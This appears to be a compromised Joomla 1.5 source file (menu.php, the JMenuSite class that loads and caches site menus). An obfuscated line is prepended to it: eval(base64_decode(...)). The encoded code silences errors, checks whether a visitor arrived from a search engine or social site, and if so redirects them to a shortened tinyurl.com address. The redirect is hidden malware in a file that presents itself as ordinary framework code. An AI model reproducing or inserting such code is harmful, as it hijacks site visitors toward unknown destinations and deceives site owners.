<?php eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9jeXpxZHlnIik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: menu.php 8682 2007-08-31 18:36:45Z jinx $
 * @package		Joomla.Framework
 * @subpackage	Application
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * JMenu class
 *
 * @package		Joomla.Framework
 * @subpackage	Application
 * @since		1.5
 */
class JMenuSite extends JMenu
{
	/**
	 * Loads the entire menu table into memory
	 *
	 * @access public
	 * @return array
	 */
	function load()
	{

		$cache = &JFactory::getCache('_system', 'output');

		if (!$data = $cache->get('menu_items')) {
		// Initialize some variables
		$db		= & JFactory::getDBO();

		$sql	= 'SELECT m.*, c.`option` as component' .
				' FROM #__menu AS m' .
				' LEFT JOIN #__components AS c ON m.componentid = c.id'.
				' WHERE m.published = 1'.
				' ORDER BY m.sublevel, m.parent, m.ordering';
		$db->setQuery($sql);

		if (!($menus = $db->loadObjectList('id'))) {
			JError::raiseWarning('SOME_ERROR_CODE', "Error loading Menus: ".$db->getErrorMsg());
			return false;
		}

		foreach($menus as $key => $menu)
		{
			//Get parent information
			$parent_route = '';
			$parent_tree  = array();
			if(($parent = $menus[$key]->parent) && (isset($menus[$parent])) &&
				(is_object($menus[$parent])) && (isset($menus[$parent]->route)) && isset($menus[$parent]->tree)) {
				$parent_route = $menus[$parent]->route.'/';
				$parent_tree  = $menus[$parent]->tree;
			}

			//Create tree
			array_push($parent_tree, $menus[$key]->id);
			$menus[$key]->tree   = $parent_tree;

			//Create route
			$route = $parent_route.$menus[$key]->alias;
			$menus[$key]->route  = $route;

			//Create the query array
			$url = str_replace('index.php?', '', $menus[$key]->link);
			if(strpos($url, '&amp;') !== false)
			{
			   $url = str_replace('&amp;','&',$url);
			}

			parse_str($url, $menus[$key]->query);
		}

			$cache->store(serialize($menus), 'menu_items');
		$this->_items = $menus;
		} else {
			$this->_items = unserialize($data);
	}
	}
}
